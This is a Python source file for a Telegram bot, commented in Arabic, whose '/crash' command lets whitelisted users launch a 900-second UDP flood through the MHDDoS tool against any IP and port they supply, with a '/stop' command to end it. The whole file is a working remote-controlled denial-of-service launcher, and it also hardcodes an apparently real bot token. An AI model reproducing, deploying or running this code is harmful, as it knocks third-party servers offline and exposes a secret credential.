import telebot
import os
import time

# التوكن تا البوت
TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
bot = telebot.TeleBot(TOKEN)

# قائمة المستخدمين المسموح لهم بدون حد زمني
ALLOWED_USERS = [1480248962,7684261013,8068341198]  # ضع هنا معرفات المستخدمين المسموح لهم باستعمال /crash

# قواميس لتتبع آخر وقت تنفيذ الأمر لكل مستخدم
user_last_used = {}

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id
        current_time = time.time()

        # تحقق إذا كان المستخدم في القائمة المسموحة
        if user_id not in ALLOWED_USERS:
            bot.reply_to(
                message,
                f"🚫 *عذرًا، ليس لديك صلاحيات لاستخدام هذا الأمر!* 🚫\n\n"
                f"⚠️ _إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع مسؤول البوت._",
                parse_mode="Markdown"
            )
            return

        # تحديث وقت آخر استخدام
        user_last_used[user_id] = current_time

        # نجيبو النص اللي بعد /crash
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "رجاءً أكتب الأمر بالشكل الصحيح: /crash <IP>:<PORT>")
            return

        ip_port = command_parts[1]
        # التحقق من الشكل الصحيح للـ IP:PORT
        if ':' not in ip_port:
            bot.reply_to(message, "الشكل غير صحيح! لازم تكتب IP:PORT بالشكل الصحيح.")
            return

        # تفريق الـ IP والـ PORT
        ip, port = ip_port.split(':')
        if not ip or not port.isdigit():
            bot.reply_to(message, "الشكل غير صحيح! تأكد من الـ IP والـ PORT.")
            return

        # الرد على المستخدم
        response = f"🚀 Spamming this IP ===> {ip}:{port} for 900 seconds 🚀"
        bot.reply_to(message, response)

        # تحضير الأمر باش يشغل الكود
        command = f'python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} 100 900'
        os.system(command)
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

@bot.message_handler(commands=['stop'])
def handle_stop_command(message):
    try:
        user_id = message.from_user.id

        # تحقق إذا المستخدم مسموح له باستخدام الأمر
        if user_id not in ALLOWED_USERS:
            bot.reply_to(
                message,
                f"🚫 *عذرًا، ليس لديك صلاحيات لاستخدام هذا الأمر!* 🚫\n\n"
                f"⚠️ _إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع مسؤول البوت._",
                parse_mode="Markdown"
            )
            return

        # الرد على المستخدم
        bot.reply_to(message, "⏹️ جاري إيقاف جميع العمليات...")

        # تنفيذ أمر الإيقاف
        os.system("python3 /workspaces/MHDDoS/start.py stop")

        # تأكيد الإيقاف
        bot.reply_to(message, "✅ تم إيقاف العمليات بنجاح!")
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

# تشغيل البوت
print("بوت تليجرام راهو يخدم...")
bot.polling()
